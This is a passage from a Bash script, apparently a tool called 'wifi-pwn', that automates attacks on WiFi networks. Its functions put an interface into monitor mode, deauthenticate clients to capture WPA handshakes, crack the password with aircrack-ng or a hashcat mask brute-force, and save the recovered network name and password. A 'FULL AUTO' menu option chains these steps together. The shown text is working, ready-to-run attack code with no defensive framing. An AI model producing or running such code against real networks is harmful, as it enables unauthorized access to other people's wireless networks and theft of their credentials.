        if [[ -n "\$CUSTOM_CHARSET" ]]; then
            MASK="\${MASK}?1"
        else
            MASK="\${MASK}?\$CHARSET_BUILTIN"
        fi
    done

    echo -e "\${YELLOW}[*] Trying length: \${GREEN}\${i}\${NC} characters [\${CHARSET_LABEL}]"
    echo -e "\${YELLOW}[*] Mask: \${GREEN}\${MASK}\${NC}"
    echo ""

    if [[ -n "\$CUSTOM_CHARSET" ]]; then
        hashcat -m "\$HASH_MODE" -a 3 -w 3 -1 "\$CUSTOM_CHARSET" "\$HASH_FILE" "\$MASK" 2>&1
    else
        hashcat -m "\$HASH_MODE" -a 3 -w 3 "\$HASH_FILE" "\$MASK" 2>&1
    fi

    echo ""
    FOUND_LINE=\$(hashcat -m "\$HASH_MODE" --show "\$HASH_FILE" 2>/dev/null | head -1)

    if [[ -n "\$FOUND_LINE" ]]; then
        PASS_DIR=\$(dirname "\$HASH_FILE")
        PASS_FILE="\$PASS_DIR/password_mask_attack.txt"
        PASSWORD="\${FOUND_LINE##*:}"
        if [[ "\$HASH_FILE" == *.22000 ]]; then
            ESSID=\$(head -1 "\$HASH_FILE" | cut -d'*' -f6)
        else
            ESSID="Unknown"
        fi
        echo "Network: \$ESSID" > "\$PASS_FILE"
        echo "Password: \$PASSWORD" >> "\$PASS_FILE"
        echo ""
        echo -e "\${GREEN}[+] PASSWORD FOUND!\${NC}"
        echo -e "\${GREEN}[+] Password: \${PASSWORD}\${NC}"
        echo -e "\${YELLOW}[*] Saved to: \$PASS_FILE\${NC}"
        echo -e "\${YELLOW}[*] Close this window manually when done.\${NC}"
        echo ""
        echo "FOUND" > "\$RESULT_FILE"
        echo ""
        echo -e "\${GREEN}[\${WHITE}root\${GREEN}@\${RED}wifi-pwn\${GREEN}]~# \${NC}"
        read DUMMY
        exit 0
    fi

    echo ""
    echo -e "\${YELLOW}[*] Password not found for length \${i}.\${NC}"
    echo ""
    local NEXT=\$((i+1))
    if [[ \$NEXT -gt \$MAX_LEN ]]; then
        echo -e "\${YELLOW}[*] Reached maximum length (\$MAX_LEN). Moving to next charset.\${NC}"
        break
    fi
    echo -e "\${CYAN}[?]\${NC} Try length \${NEXT}? \${DARK}(Y/n)\${NC}:"
    echo -ne "\${GREEN}[\${WHITE}root\${GREEN}@\${RED}wifi-pwn\${GREEN}]~# \${NC}"
    read CONTINUE

    if [[ "\$CONTINUE" == "n" || "\$CONTINUE" == "N" ]]; then
        echo ""
        echo -e "\${YELLOW}[*] Mask attack stopped by user.\${NC}"
        echo "STOPPED" > "\$RESULT_FILE"
        echo ""
        echo -e "\${GREEN}[\${WHITE}root\${GREEN}@\${RED}wifi-pwn\${GREEN}]~# \${NC}"
        read DUMMY
        exit 0
    fi
    echo ""
done

echo -e "\${RED}[!] All lengths \$MIN_LEN-\$MAX_LEN tested for this charset.\${NC}"
echo "NOT_FOUND" > "\$RESULT_FILE"
echo ""
echo -e "\${GREEN}[\${WHITE}root\${GREEN}@\${RED}wifi-pwn\${GREEN}]~# \${NC}"
read DUMMY
MASKEOF
        chmod +x "$MASK_SCRIPT"

        local TERMINAL=$(detect_terminal)
        case "$TERMINAL" in
            gnome-terminal)
                gnome-terminal -- bash -c "\"$MASK_SCRIPT\"" 2>/dev/null &
                ;;
            konsole)
                konsole --hold -e "$MASK_SCRIPT" 2>/dev/null &
                ;;
            x-terminal-emulator|xterm|xfce4-terminal|lxterminal|mate-terminal|terminator|urxvt|rxvt)
                $TERMINAL -e "$MASK_SCRIPT" 2>/dev/null &
                ;;
            *)
                echo -e "${YELLOW}[*] No GUI terminal found, installing xterm...${NC}"
                apt-get install -y xterm 2>/dev/null
                if command -v xterm &>/dev/null; then
                    xterm -e "$MASK_SCRIPT" 2>/dev/null &
                else
                    echo -e "${YELLOW}[*] Running mask attack in background...${NC}"
                    bash "$MASK_SCRIPT" &
                fi
                ;;
        esac

        echo ""
        echo -e "${GREEN}[>]${NC} ${WHITE}A new terminal has opened for Hashcat Mask Attack.${NC}"
        echo -e "${GREEN}[>]${NC} ${WHITE}Testing lengths ${MIN_LEN}-${MAX_LEN} with:${NC} $CHARSET_LABEL"
        echo ""

        while [[ ! -f "$RESULT_FILE" ]]; do
            sleep 1
        done

        local RESULT=$(cat "$RESULT_FILE" 2>/dev/null)
        rm -f "$RESULT_FILE" "$MASK_SCRIPT" 2>/dev/null

        if [[ "$RESULT" == "FOUND" ]]; then
            echo -e "${GREEN}[+] PASSWORD FOUND! Saved to: ${WHITE}$OUTPUT_DIR/password_mask_attack.txt${NC}"
            GLOBAL_DONE=true
        else
            if [[ "$RESULT" == "STOPPED" ]]; then
                echo -e "${YELLOW}[*] Mask attack stopped by user.${NC}"
            else
                echo -e "${YELLOW}[*] Password not found with this charset.${NC}"
            fi

            echo ""
            hacker_read EXTEND "${CYAN}[?]${NC} Extend max length beyond ${WHITE}${MAX_LEN}${NC}? ${DARK}(Y/n)${NC}:"
            if [[ "$EXTEND" != "n" && "$EXTEND" != "N" && -n "$EXTEND" ]]; then
                local SUGGESTED_MAX=$((MAX_LEN + 1))
                hacker_read MAX_LEN "${YELLOW}[*]${NC} New max length ${DARK}(default: ${SUGGESTED_MAX})${NC}:"
                MAX_LEN="${MAX_LEN:-$SUGGESTED_MAX}"
                echo -e "${GREEN}[+]${NC} Extended range: ${WHITE}${MIN_LEN}-${MAX_LEN}${NC} chars"
                echo ""
            fi

            echo ""
            hacker_read TRY_AGAIN "${CYAN}[?]${NC} Try a different charset? ${DARK}(Y/n)${NC}:"
            if [[ "$TRY_AGAIN" == "n" || "$TRY_AGAIN" == "N" ]]; then
                GLOBAL_DONE=true
            fi
        fi
    done
}

crack_password() {
    if [[ -z "$WORDLIST" || ! -f "$WORDLIST" ]]; then
        echo -e "${RED}[!] No wordlist available. Run wordlist preparation first.${NC}"
        return 1
    fi

    if [[ -z "$CAPTURE_FILE" || ! -f "$CAPTURE_FILE" ]]; then
        CAPTURE_FILE=$(ls -t "$CAP_FILE_PATH"/*.cap 2>/dev/null | head -1)
    fi
    if [[ -z "$CAPTURE_FILE" || ! -f "$CAPTURE_FILE" ]]; then
        echo -e "${RED}[!] No .cap file found. Capture a handshake first.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[*] Cracking WiFi password...${NC}"
    echo -e "${YELLOW}[*] Using capture: ${WHITE}$(basename "$CAPTURE_FILE")${NC}"
    echo -e "${YELLOW}[*] Using wordlist: ${WHITE}$WORDLIST${NC}"

    local CRACK_OUTPUT
    CRACK_OUTPUT=$(aircrack-ng "$CAPTURE_FILE" -w "$WORDLIST" 2>&1)
    echo "$CRACK_OUTPUT"

    if echo "$CRACK_OUTPUT" | grep -q "KEY FOUND"; then
        local FOUND_LINE
        FOUND_LINE=$(echo "$CRACK_OUTPUT" | grep "KEY FOUND" | head -1)
        echo ""
        echo -e "${GREEN}[+] ${FOUND_LINE}${NC}"
    else
        echo ""
        echo -e "${RED}[!] Password not found in wordlist${NC}"
    fi
}

crack_password_terminal() {
    if [[ -z "$WORDLIST" || ! -f "$WORDLIST" ]]; then
        echo -e "${RED}[!] No wordlist available. Run wordlist preparation first.${NC}"
        return 1
    fi

    if [[ -z "$CAPTURE_FILE" || ! -f "$CAPTURE_FILE" ]]; then
        CAPTURE_FILE=$(ls -t "$CAP_FILE_PATH"/*.cap 2>/dev/null | head -1)
    fi
    if [[ -z "$CAPTURE_FILE" || ! -f "$CAPTURE_FILE" ]]; then
        echo -e "${RED}[!] No .cap file found. Capture a handshake first.${NC}"
        return 1
    fi

    local CRACK_SCRIPT="/tmp/wifi_crack_$$.sh"
    local RESULT_FILE="/tmp/wifi_crack_result_$$"
    local PASS_FILE="$CAP_FILE_PATH/password_cracked.txt"

    cat > "$CRACK_SCRIPT" << 'CRACKEOF'
#!/bin/bash
CAPTURE="$1"
WORDLIST="$2"
RESULT_FILE="$3"
ME="$4"
PASS_FILE="$5"
OUT_FILE="/tmp/crack_out_$$"

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${NC}  ${YELLOW}⚡${NC} PASSWORD CRACKING IN PROGRESS ${YELLOW}⚡${NC} ${CYAN}║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}[*]${NC} Source:   ${GREEN}$CAPTURE${NC}"
echo -e "${YELLOW}[*]${NC} Wordlist: ${GREEN}$(basename "$WORDLIST")${NC}"
echo ""
echo -e "${YELLOW}[*] Press ${RED}q${YELLOW} + ENTER to stop${NC}"
echo ""

aircrack-ng "$CAPTURE" -w "$WORDLIST" > >(tee "$OUT_FILE") 2>&1 &
CRACK_PID=$!

while kill -0 $CRACK_PID 2>/dev/null; do
    read -t 1 -r -n 1 KEY < /dev/tty 2>/dev/null
    if [[ "$KEY" == "q" || "$KEY" == "Q" ]]; then
        kill $CRACK_PID 2>/dev/null
        wait $CRACK_PID 2>/dev/null
        echo ""
        echo -e "${RED}[!] Stopped by user.${NC}"
        echo "STOPPED" > "$RESULT_FILE"
        rm -f "$ME" "$OUT_FILE"
        echo ""
        echo -e "${GREEN}[${WHITE}root${GREEN}@${RED}wifi-pwn${GREEN}]~# ${NC}"
        read
        exit
    fi
done
wait $CRACK_PID 2>/dev/null
echo ""

if grep -q "KEY FOUND" "$OUT_FILE" 2>/dev/null; then
    FOUND=$(grep "KEY FOUND" "$OUT_FILE" | head -1)
    echo -e "${GREEN}[+] $FOUND${NC}"
    PASSWORD=$(echo "$FOUND" | sed 's/.*\[ *\(.*\) *\].*/\1/')
    ESSID=$(aircrack-ng "$CAPTURE" 2>/dev/null | awk 'NR>=4 && /^[[:space:]]*[0-9]/ {for(i=3;i<=NF-3;i++) printf "%s%s", $i, (i<NF-3?FS:""); print ""; exit}')
    echo "Network: $ESSID" > "$PASS_FILE"
    echo "Password: $PASSWORD" >> "$PASS_FILE"
    echo -e "${YELLOW}[*] Password saved to: $PASS_FILE${NC}"
    echo "FOUND" > "$RESULT_FILE"
else
    echo -e "${RED}[!] Password not found in wordlist${NC}"
    echo "NOT_FOUND" > "$RESULT_FILE"
fi

rm -f "$ME" "$OUT_FILE"
echo ""
echo -e "${GREEN}[${WHITE}root${GREEN}@${RED}wifi-pwn${GREEN}]~# ${NC}"
read
CRACKEOF
    chmod +x "$CRACK_SCRIPT"

    local TERMINAL=$(detect_terminal)

    case "$TERMINAL" in
        gnome-terminal)
            gnome-terminal -- bash -c "\"$CRACK_SCRIPT\" \"$CAPTURE_FILE\" \"$WORDLIST\" \"$RESULT_FILE\" \"$CRACK_SCRIPT\" \"$PASS_FILE\"" 2>/dev/null &
            ;;
        konsole)
            konsole --hold -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" "$PASS_FILE" 2>/dev/null &
            ;;
        x-terminal-emulator|xterm|xfce4-terminal|lxterminal|mate-terminal|terminator|urxvt|rxvt)
            $TERMINAL -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" "$PASS_FILE" 2>/dev/null &
            ;;
        *)
            echo -e "${YELLOW}[*] No GUI terminal found, installing xterm...${NC}"
            apt-get install -y xterm 2>/dev/null
            if command -v xterm &>/dev/null; then
                xterm -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" "$PASS_FILE" 2>/dev/null &
            else
                echo -e "${YELLOW}[*] Running crack in background...${NC}"
                bash "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" "$PASS_FILE" &
            fi
            ;;
    esac

    echo ""
    echo -e "${GREEN}[>]${NC} ${WHITE}A new terminal window has opened for password cracking.${NC}"
    echo -e "${GREEN}[>]${NC} ${WHITE}Watch the progress there.${NC}"
    echo -e "${GREEN}[>]${NC} ${WHITE}Press 'q' in that window to stop.${NC}"

    while [[ ! -f "$RESULT_FILE" ]]; do
        sleep 1
    done

    local RESULT=$(cat "$RESULT_FILE" 2>/dev/null)
    rm -f "$RESULT_FILE" "$CRACK_SCRIPT" 2>/dev/null

    if [[ "$RESULT" == "FOUND" ]]; then
        echo ""
        echo -e "${GREEN}[+] Password found! Saved to: ${WHITE}$PASS_FILE${NC}"
        hacker_read "" "${GREEN}[${WHITE}ENTER${GREEN}]${NC} Press ENTER to continue:"
    elif [[ "$RESULT" == "STOPPED" ]]; then
        echo ""
        echo -e "${YELLOW}[*] Cracking was stopped by user.${NC}"
    else
        echo ""
        echo -e "${YELLOW}[*] Password not found in wordlist.${NC}"
    fi
}

restart_network() {
    echo -e "${YELLOW}[*] Cleaning up and restarting NetworkManager...${NC}"

    local MON_IFACES=()
    if [[ -n "$MON_INTERFACE" ]]; then
        MON_IFACES+=("$MON_INTERFACE")
    fi
    while read -r iface; do
        [[ -n "$iface" ]] && MON_IFACES+=("$iface")
    done < <(iwconfig 2>/dev/null | grep -o '^wl[^ ]*mon' | sort -u)

    for iface in "${MON_IFACES[@]}"; do
        echo -e "${YELLOW}[*] Stopping monitor: $iface${NC}"
        airmon-ng stop "$iface" 2>/dev/null
        iw dev "$iface" del 2>/dev/null
    done

    local ORIG=$(iwconfig 2>/dev/null | grep -o '^wl[^ ]*' | grep -v 'mon$' | head -1)
    if [[ -n "$ORIG" ]]; then
        ip link set "$ORIG" down 2>/dev/null
        ip link set "$ORIG" up 2>/dev/null
    fi

    airmon-ng check kill 2>/dev/null

    local TRIES=0
    systemctl restart NetworkManager 2>/dev/null &
    while ! systemctl is-active --quiet NetworkManager 2>/dev/null && [[ $TRIES -lt 10 ]]; do
        sleep 1
        ((TRIES++))
    done
    if systemctl is-active --quiet NetworkManager 2>/dev/null; then
        echo -e "${GREEN}[+] NetworkManager restarted${NC}"
    else
        systemctl start NetworkManager 2>/dev/null
        echo -e "${GREEN}[+] NetworkManager started${NC}"
    fi
}

# ============ MAIN MENU ============

main_menu() {
    while true; do
        banner
        echo -e "${DARK}┌──────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${DARK}│${NC}  ${CYAN}SELECT ATTACK VECTOR${NC}                                         ${DARK}│${NC}"
        echo -e "${DARK}├──────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[1]${NC}  FULL AUTO — Complete attack sequence              ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[2]${NC}  ENABLE MONITOR MODE                               ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[3]${NC}  SCAN NETWORKS                                     ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[4]${NC}  CAPTURE HANDSHAKE — Set target & deauth           ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[5]${NC}  CRACK PASSWORD                                    ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[6]${NC}  CLEANUP — Stop monitor & restart network          ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[7]${NC}  MASK ATTACK — Hashcat Auto (8-22 chars)            ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${RED}[8]${NC}  EXIT                                             ${DARK}│${NC}"
        echo -e "${DARK}└──────────────────────────────────────────────────────────────┘${NC}"
        echo ""
        echo -ne "${GREEN}[${WHITE}root${GREEN}@${RED}wifi-pwn${GREEN}]~# ${NC}"
        read CHOICE

        case $CHOICE in
            1)
                setup_output_dir
                select_interface
                kill_interfering
                enable_monitor
                scan_networks
                set_target
                capture_and_deauth
                restart_network
                prepare_wordlist
                crack_password_terminal
                echo -e "${GREEN}[+] Full automation complete${NC}"
                hacker_read "" "Press ENTER to continue:"
                ;;
            2)
                select_interface
                kill_interfering
                enable_monitor
                hacker_read "" "Press ENTER to continue:"
                ;;
            3)
                [[ -z "$MON_INTERFACE" ]] && { select_interface; kill_interfering; enable_monitor; }
                scan_networks
                hacker_read "" "Press ENTER to continue:"
                ;;
            4)
                setup_output_dir
                [[ -z "$MON_INTERFACE" ]] && select_interface
                set_target
                capture_and_deauth
                hacker_read "" "Press ENTER to continue:"
                ;;
            5)
                setup_output_dir
                list_existing_caps
                CAPTURE_FILE=$(ls -t "$CAP_FILE_PATH"/*.cap 2>/dev/null | head -1)
                if [[ -z "$CAPTURE_FILE" ]]; then
                    echo -e "${RED}[!] No .cap files found in output folder${NC}"
                    hacker_read "" "Press ENTER to continue:"
                    continue
                fi
                echo -e "${GREEN}[+] Using latest capture: ${WHITE}$(basename "$CAPTURE_FILE")${NC}"
                prepare_wordlist
                crack_password_terminal
                hacker_read "" "Press ENTER to continue:"
                ;;
            6)
                restart_network
                hacker_read "" "Press ENTER to continue:"
                ;;
            7)
                mask_attack
                hacker_read "" "Press ENTER to continue:"
                ;;
            8)
                echo -e "${GREEN}[+] Exiting${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                hacker_read "" "Press ENTER to continue:"
                ;;
        esac
    done
}

check_root
main_menu
